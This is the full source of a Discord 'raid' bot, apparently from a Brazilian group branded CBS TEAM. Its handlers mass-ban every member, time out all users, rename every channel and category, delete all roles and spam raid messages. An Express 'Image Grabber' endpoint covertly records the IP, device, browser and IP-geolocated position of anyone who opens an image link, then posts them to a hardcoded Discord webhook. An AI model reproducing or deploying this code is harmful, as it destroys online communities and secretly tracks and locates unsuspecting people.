const { Client, GatewayIntentBits, REST, Routes, Collection, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const dotenv = require('dotenv');
const cron = require('node-cron');
const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

client.commands = new Collection();
client.menuCommands = new Collection();
client.timers = new Map();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
const commands = [];

for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  if (command.data) {
    client.commands.set(command.data.name, command);
    commands.push(command.data.toJSON());
  }
  if (command.name) {
    client.menuCommands.set(command.name, command);
  }
}

client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} está online!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    console.log('🔄 Registrando comandos...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log(`✅ ${commands.length} comandos registrados!`);
  } catch (error) {
    console.error('❌ Erro:', error);
  }

  client.user.setPresence({
    activities: [{ name: '!menu | CBS TEAM', type: 3 }],
    status: 'online'
  });

  cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
  console.log('📋 Digite !menu no Discord');
  console.log('📸 Digite /img para gerar Image Grabber');
});

// ============ SLASH COMMANDS ============
client.on('interactionCreate', async interaction => {
  if (interaction.isCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    try {
      await command.execute(interaction, client);
    } catch (error) {
      console.error(error);
      await interaction.reply({ content: '❌ Erro.', flags: 64 }).catch(() => {});
    }
  }
});

// ============ MODAIS ============
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  const modalId = interaction.customId;

  if (modalId === 'editRaidModal') {
    const categoria = interaction.fields.getTextInputValue('categoriaInput');
    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
    const config = require('./config');
    if (categoria) config.raid.baseName = categoria;
    if (mensagem) config.raid.spamMessage = mensagem;
    await interaction.reply({
      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
      flags: 64
    }).catch(() => {});
  }

  if (modalId === 'renameModal') {
    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
    const nome = interaction.fields.getTextInputValue('nomeInput');
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
    if (tipo === 'canal') {
      const channels = guild.channels.cache.filter(c => c.type === 0);
      let count = 0;
      for (const [id, ch] of channels) {
        try { await ch.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 }).catch(() => {});
    } else if (tipo === 'categoria') {
      const categories = guild.channels.cache.filter(c => c.type === 4);
      let count = 0;
      for (const [id, cat] of categories) {
        try { await cat.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 }).catch(() => {});
    } else {
      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 }).catch(() => {});
    }
  }

  if (modalId === 'banAllModal') {
    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 }).catch(() => {});
    let banidos = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
      banidos += chunk.length;
      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`).catch(() => {});
    }
    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`).catch(() => {});
  }

  if (modalId === 'endModal') {
    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
    const duracao = minutos * 60 * 1000;
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId);
    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 }).catch(() => {});
    let timeoutados = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
      timeoutados += chunk.length;
      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`).catch(() => {});
    }
    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`).catch(() => {});
  }
});

// ============ !MENU ============
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith('!')) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  const command = client.menuCommands.get(commandName);
  if (!command) return;
  try {
    await command.execute(message, args, client);
  } catch (error) {
    console.error(error);
    await message.reply('❌ Erro.').catch(() => {});
  }
});

// ============ BOTÕES ============
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const mensagemSpam = 
    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;

  // ===== SPAM 1 VEZ =====
  if (interaction.customId === 'spam1') {
    await interaction.deferReply({ flags: 64 }).catch(() => {});
    const channel = interaction.channel;
    if (!channel) {
      return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
    }
    let enviadas = 0;
    for (let i = 0; i < 1; i++) {
      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
    }
    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`).catch(() => {});
    return;
  }

  // ===== SPAM 2 VEZES =====
  if (interaction.customId === 'spam2') {
    await interaction.deferReply({ flags: 64 }).catch(() => {});
    const channel = interaction.channel;
    if (!channel) {
      return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
    }
    let enviadas = 0;
    for (let i = 0; i < 2; i++) {
      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
    }
    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`).catch(() => {});
    return;
  }

  // ===== BOTÕES DO MENU =====
  const menuMap = {
    'menu_nuke': 'nuke',
    'menu_timer': 'timer',
    'menu_img': 'img',
    'menu_say': 'say',
    'menu_reverse': 'reverse',
    'menu_invite': 'invite',
    'menu_channelspam': 'channelspam',
    'menu_banall': 'banall',
    'menu_end': 'end',
    'menu_deleterole': 'deleterole'
  };

  if (menuMap[interaction.customId]) {
    const cmdName = menuMap[interaction.customId];
    const cmd = client.commands.get(cmdName);
    if (!cmd) {
      return interaction.reply({ content: '❌ Comando não encontrado.', flags: 64 }).catch(() => {});
    }
    try {
      // Para o comando invite, precisamos passar client
      if (cmdName === 'invite') {
        await cmd.execute(interaction, client);
      } else {
        await cmd.execute(interaction, client);
      }
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: '❌ Erro.', flags: 64 }).catch(() => {});
    }
    return;
  }

  // ===== BOTÃO PARAR TIMER =====
  if (interaction.customId === 'stop_timer') {
    const DONO_ID = '1409370594138525746';
    if (interaction.user.id !== DONO_ID) {
      return interaction.reply({ content: '❌ Apenas o dono pode parar o timer.', flags: 64 }).catch(() => {});
    }

    let timerEncontrado = null;
    let timerKey = null;
    for (const [key, data] of client.timers) {
      if (data.channel.id === interaction.channel.id && data.ativo) {
        timerEncontrado = data;
        timerKey = key;
        break;
      }
    }

    if (!timerEncontrado) {
      return interaction.reply({ content: '❌ Nenhum timer ativo neste canal.', flags: 64 }).catch(() => {});
    }

    timerEncontrado.ativo = false;
    if (timerEncontrado.timeout) clearTimeout(timerEncontrado.timeout);
    if (timerEncontrado.interval) clearInterval(timerEncontrado.interval);
    client.timers.delete(timerKey);

    const embedCancel = new EmbedBuilder()
      .setTitle('⏱️ TIMER CANCELADO')
      .setDescription('❌ O timer foi **cancelado** pelo dono.')
      .setColor(0xFF0000)
      .setTimestamp();

    try {
      const msg = await interaction.channel.messages.fetch(timerEncontrado.messageId);
      await msg.edit({ embeds: [embedCancel], components: [] });
    } catch {}

    await interaction.reply({ content: '✅ **Timer cancelado com sucesso!**', flags: 64 }).catch(() => {});
    return;
  }

  // ===== CONFIRMAR / CANCELAR DELETEROLE =====
  if (interaction.customId === 'confirmDeleteRoles') {
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Apenas em servidores.', flags: 64 }).catch(() => {});
    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
    await interaction.deferReply({ flags: 64 }).catch(() => {});
    let deletados = 0;
    const list = [...roles.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
      deletados += chunk.length;
      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`).catch(() => {});
    }
    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`).catch(() => {});
  }

  if (interaction.customId === 'cancelDeleteRoles') {
    await interaction.reply({ content: '❌ Cancelado.', flags: 64 }).catch(() => {});
  }
});

// ==================== SERVIDOR HTTP E IMAGE GRABBER ====================
const app = express();
const port = process.env.PORT || 3000;
app.use(express.static('public'));

const ipData = {};
const imageStore = {};

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528811226405142528/-b8_dqEYF8_QluNDfXYpyvar40PL9HD_-7OqHrZC5UbWJrjDk6Mmq3iwsktXZaHbSUP6';

// ===== FUNÇÃO PARA BUSCAR LOCALIZAÇÃO POR IP =====
async function buscarLocalizacao(ip) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,city,regionName,lat,lon,isp,org,timezone`);
    const data = await response.json();
    if (data.status === 'success') {
      return {
        pais: data.country || 'Desconhecido',
        cidade: data.city || 'Desconhecido',
        regiao: data.regionName || 'Desconhecido',
        lat: data.lat || null,
        lon: data.lon || null,
        isp: data.isp || 'Desconhecido',
        org: data.org || 'Desconhecido',
        timezone: data.timezone || 'Desconhecido'
      };
    }
    return null;
  } catch {
    return null;
  }
}

async function enviarWebhook(id, dados) {
  if (!dados) return;
  const embed = {
    title: '📸 NOVO CLIQUE CAPTURADO!',
    color: 0xFF0000,
    fields: [
      { name: '🌐 IP', value: dados.ip || 'Desconhecido', inline: true },
      { name: '🌍 Localização', value: dados.localizacao || 'Desconhecido', inline: true },
      { name: '📱 Dispositivo', value: dados.device || 'Desconhecido', inline: true },
      { name: '💻 Navegador', value: dados.browser || 'Desconhecido', inline: true },
      { name: '📱 SO', value: dados.os || 'Desconhecido', inline: true },
      { name: '🖥️ User-Agent', value: dados.userAgent || 'Desconhecido', inline: false },
      { name: '📅 Data/Hora', value: dados.timestamp || 'Desconhecido', inline: true },
      { name: '🆔 ID', value: `\`${id}\``, inline: true },
      { name: '🔍 Origem', value: dados.origem || 'Desconhecido', inline: true }
    ],
    footer: { text: 'CBS TEAM - Image Grabber' },
    timestamp: new Date()
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    console.log(`📨 Dados enviados para o webhook (ID: ${id})`);
  } catch (e) {
    console.error('❌ Erro ao enviar webhook:', e);
  }
}

app.get('/img/:id', async (req, res) => {
  const id = req.params.id;
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Desconhecido';

  // ===== DETECTA SE É DISCORD WEB OU APP =====
  let origem = 'Desconhecido';
  if (userAgent.includes('Discord')) {
    if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
      origem = '📱 Discord App (Mobile)';
    } else {
      origem = '💻 Discord App (Desktop)';
    }
  } else if (userAgent.includes('Mozilla') && userAgent.includes('Chrome')) {
    origem = '🌐 Navegador (Chrome)';
  } else if (userAgent.includes('Mozilla') && userAgent.includes('Firefox')) {
    origem = '🌐 Navegador (Firefox)';
  } else if (userAgent.includes('Mozilla') && userAgent.includes('Safari')) {
    origem = '🌐 Navegador (Safari)';
  } else if (userAgent.includes('Mozilla') && userAgent.includes('Edge')) {
    origem = '🌐 Navegador (Edge)';
  } else {
    origem = '🌐 Navegador (Desconhecido)';
  }

  // ===== EXTRAI DISPOSITIVO, OS E NAVEGADOR =====
  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
  if (userAgent && userAgent !== 'Desconhecido') {
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'MacOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    if (userAgent.includes('Mobile')) device = 'Celular';
    else if (userAgent.includes('Tablet')) device = 'Tablet';
    else device = 'Computador';
  }

  // ===== BUSCA LOCALIZAÇÃO POR IP =====
  let localizacao = 'Desconhecido';
  const geo = await buscarLocalizacao(userIP);
  if (geo) {
    localizacao = `${geo.cidade}, ${geo.regiao}, ${geo.pais}`;
    if (geo.lat && geo.lon) {
      localizacao += ` (${geo.lat}, ${geo.lon})`;
    }
  }

  // ===== SALVA DADOS =====
  ipData[id] = {
    ip: userIP,
    localizacao: localizacao,
    device: `${device} (${os})`,
    browser: browser,
    os: os,
    userAgent: userAgent,
    origem: origem,
    timestamp: new Date().toISOString()
  };

  // ===== ENVIA PARA O WEBHOOK =====
  await enviarWebhook(id, ipData[id]);

  // ===== SERVE A IMAGEM =====
  let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
  if (!fs.existsSync(imagemPath)) {
    imagemPath = path.join(__dirname, 'public', 'imagem.png');
  }
  if (fs.existsSync(imagemPath)) {
    res.sendFile(imagemPath);
  } else {
    res.redirect('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
  }
});

app.get('/dados/:id', (req, res) => {
  const id = req.params.id;
  if (ipData[id]) res.json(ipData[id]);
  else res.json({ error: 'Dados não encontrados' });
});

app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));

app.listen(port, () => {
  console.log(`🌐 HTTP rodando na porta ${port}`);
  console.log(`📸 Image Grabber: https://cbsteam.onrender.com/img/ID`);
  console.log(`📨 Webhook configurado: ${WEBHOOK_URL}`);
});

// ==================== LOGIN ====================
client.login(process.env.DISCORD_TOKEN);

process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));